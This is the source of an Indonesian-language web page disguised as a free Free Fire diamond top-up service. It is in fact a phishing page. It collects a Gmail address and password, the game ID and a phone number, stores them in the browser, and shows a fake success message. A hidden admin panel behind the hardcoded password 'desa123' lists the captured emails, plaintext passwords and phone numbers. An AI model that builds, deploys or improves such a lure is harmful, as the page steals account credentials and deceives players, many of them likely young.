<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Isi DM FF - Free Fire Diamond Top Up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1e0033, #35005e);
            color: white;
            min-height: 100vh;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .logo {
            text-align: center;
            margin: 20px 0 40px;
        }
        
        .logo h1 {
            font-size: 28px;
            margin-bottom: 10px;
            background: linear-gradient(to right, #ff8a00, #e52e71);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .form-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.05);
            color: white;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #ff8a00;
            background: rgba(255, 255, 255, 0.1);
        }
        
        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: linear-gradient(to right, #ff8a00, #e52e71);
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(233, 30, 99, 0.4);
        }
        
        .success-message {
            background: rgba(46, 204, 113, 0.2);
            border: 1px solid #2ecc71;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            text-align: center;
            display: none;
        }
        
        .admin-panel {
            position: fixed;
            top: 20px;
            right: 20px;
        }
        
        .admin-btn {
            background: rgba(255, 255, 255, 0.1);
            border: none;
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 12px;
            backdrop-filter: blur(5px);
            transition: all 0.3s;
        }
        
        .admin-btn:hover {
            background: rgba(255, 255, 255, 0.2);
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background: #1e0033;
            padding: 30px;
            border-radius: 15px;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .modal-title {
            font-size: 24px;
            font-weight: 600;
            color: #ff8a00;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
        }
        
        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        .data-table th, .data-table td {
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 10px;
            text-align: left;
        }
        
        .data-table th {
            background: rgba(233, 30, 99, 0.2);
        }
        
        .data-table tr:nth-child(even) {
            background: rgba(255, 255, 255, 0.03);
        }
        
        .diamond-options {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 15px;
            display: none;
        }
        
        .diamond-option {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 15px 0;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .diamond-option:hover {
            background: rgba(233, 30, 99, 0.2);
            transform: translateY(-3px);
        }
        
        .diamond-option .amount {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 5px;
            color: #ff8a00;
        }
        
        .diamond-option.selected {
            background: rgba(233, 30, 99, 0.4);
            border-color: #e52e71;
        }
        
        @media (max-width: 600px) {
            .diamond-options {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .container {
                padding: 15px;
            }
            
            .form-container {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="admin-panel">
        <button class="admin-btn" id="adminBtn">Menu Admin</button>
    </div>
    
    <div class="container">
        <div class="logo">
            <h1>Isi DM Free Fire</h1>
        </div>
        
        <div class="form-container" id="mainForm">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" placeholder="Masukkan email Anda">
                <div class="error-message" id="emailError">Email harus menggunakan @gmail.com</div>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Masukkan password Anda">
                <div class="error-message" id="passwordError">Password tidak boleh kosong</div>
            </div>
            
            <button class="btn" id="submitBtn">Lanjutkan</button>
        </div>
        
        <div class="form-container" id="diamondForm" style="display: none;">
            <div class="form-group">
                <label for="ffId">ID Free Fire</label>
                <input type="text" id="ffId" placeholder="Masukkan ID Free Fire">
                <div class="error-message" id="ffIdError">ID harus berupa angka</div>
            </div>
            
            <div class="form-group">
                <label for="phone">Nomor HP</label>
                <input type="text" id="phone" placeholder="Masukkan nomor HP">
                <div class="error-message" id="phoneError">Nomor HP tidak valid</div>
            </div>
            
            <div class="diamond-options" id="diamondOptions">
                <div class="diamond-option" data-amount="50">
                    <div class="amount">50 DM</div>
                </div>
                <div class="diamond-option" data-amount="100">
                    <div class="amount">100 DM</div>
                </div>
                <div class="diamond-option" data-amount="150">
                    <div class="amount">150 DM</div>
                </div>
                <div class="diamond-option" data-amount="210">
                    <div class="amount">210 DM</div>
                </div>
                <div class="diamond-option" data-amount="305">
                    <div class="amount">305 DM</div>
                </div>
                <div class="diamond-option" data-amount="425">
                    <div class="amount">425 DM</div>
                </div>
                <div class="diamond-option" data-amount="630">
                    <div class="amount">630 DM</div>
                </div>
                <div class="diamond-option" data-amount="720">
                    <div class="amount">720 DM</div>
                </div>
                <div class="diamond-option" data-amount="1000">
                    <div class="amount">1000 DM</div>
                </div>
            </div>
            
            <button class="btn" id="submitDiamondBtn" style="display: none;">Kirim DM</button>
        </div>
        
        <div class="success-message" id="successMessage">
            <h3>DM Berhasil Dikirim!</h3>
            <p id="successText"></p>
        </div>
    </div>
    
    <div class="modal" id="adminModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Login Admin</h2>
                <button class="close-btn" id="closeModal">&times;</button>
            </div>
            
            <div class="form-group">
                <label for="adminPass">Password Admin</label>
                <input type="password" id="adminPass" placeholder="Masukkan password admin">
                <div class="error-message" id="adminError">Password salah</div>
            </div>
            
            <button class="btn" id="loginAdminBtn">Login</button>
            
            <div id="adminData" style="display: none; margin-top: 30px;">
                <h3 style="color: #ff8a00; margin-bottom: 15px;">Data Pengguna</h3>
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>ID FF</th>
                            <th>Email</th>
                            <th>Password</th>
                            <th>No HP</th>
                        </tr>
                    </thead>
                    <tbody id="userData">
                        <!-- Data akan dimasukkan secara dinamis -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    
    <script>
        let selectedDiamond = 0;
        let userData = JSON.parse(localStorage.getItem('ffUserData')) || [];
        
        // Admin button functionality
        document.getElementById('adminBtn').addEventListener('click', () => {
            document.getElementById('adminModal').style.display = 'flex';
        });
        
        // Close modal button
        document.getElementById('closeModal').addEventListener('click', () => {
            document.getElementById('adminModal').style.display = 'none';
            document.getElementById('adminError').style.display = 'none';
            document.getElementById('adminPass').value = '';
        });
        
        // Admin login
        document.getElementById('loginAdminBtn').addEventListener('click', () => {
            const password = document.getElementById('adminPass').value;
            
            if (password === 'desa123') {
                document.getElementById('adminError').style.display = 'none';
                document.getElementById('adminData').style.display = 'block';
                
                // Populate user data
                const tbody = document.getElementById('userData');
                tbody.innerHTML = '';
                
                if (userData.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Belum ada data</td></tr>';
                } else {
                    userData.forEach(data => {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td>${data.ffId}</td>
                            <td>${data.email}</td>
                            <td>${data.password}</td>
                            <td>${data.phone}</td>
                        `;
                        tbody.appendChild(row);
                    });
                }
            } else {
                document.getElementById('adminError').style.display = 'block';
            }
        });
        
        // Email and password form submission
        document.getElementById('submitBtn').addEventListener('click', () => {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            let valid = true;
            
            // Email validation
            if (!email.includes('@gmail.com')) {
                document.getElementById('emailError').style.display = 'block';
                valid = false;
            } else {
                document.getElementById('emailError').style.display = 'none';
            }
            
            // Password validation
            if (password.length === 0) {
                document.getElementById('passwordError').style.display = 'block';
                valid = false;
            } else {
                document.getElementById('passwordError').style.display = 'none';
            }
            
            if (valid) {
                document.getElementById('mainForm').style.display = 'none';
                document.getElementById('diamondForm').style.display = 'block';
                document.getElementById('diamondOptions').style.display = 'grid';
            }
        });
        
        // Diamond selection
        const diamondOptions = document.querySelectorAll('.diamond-option');
        diamondOptions.forEach(option => {
            option.addEventListener('click', () => {
                // Remove selected class from all options
                diamondOptions.forEach(opt => opt.classList.remove('selected'));
                
                // Add selected class to clicked option
                option.classList.add('selected');
                
                // Get selected diamond amount
                selectedDiamond = parseInt(option.getAttribute('data-amount'));
                
                // Show submit button
                document.getElementById('submitDiamondBtn').style.display = 'block';
            });
        });
        
        // Diamond form submission
        document.getElementById('submitDiamondBtn').addEventListener('click', () => {
            const ffId = document.getElementById('ffId').value;
            const phone = document.getElementById('phone').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            let valid = true;
            
            // FF ID validation (must be number)
            if (!/^\d+$/.test(ffId)) {
                document.getElementById('ffIdError').style.display = 'block';
                valid = false;
            } else {
                document.getElementById('ffIdError').style.display = 'none';
            }
            
            // Phone number validation
            if (phone.length < 10 || phone.length > 14) {
                document.getElementById('phoneError').style.display = 'block';
                valid = false;
            } else {
                document.getElementById('phoneError').style.display = 'none';
            }
            
            if (valid) {
                // Save user data
                const userEntry = {
                    ffId,
                    email,
                    password,
                    phone,
                    diamond: selectedDiamond
                };
                userData.push(userEntry);
                localStorage.setItem('ffUserData', JSON.stringify(userData));
                
                // Show success message
                document.getElementById('diamondForm').style.display = 'none';
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('successText').textContent = `DM sejumlah ${selectedDiamond} telah dikirim ke ID FF ${ffId}`;
                
                // Hide admin button
                document.getElementById('adminBtn').style.display = 'none';
            }
        });
    </script>
</body>
</html>
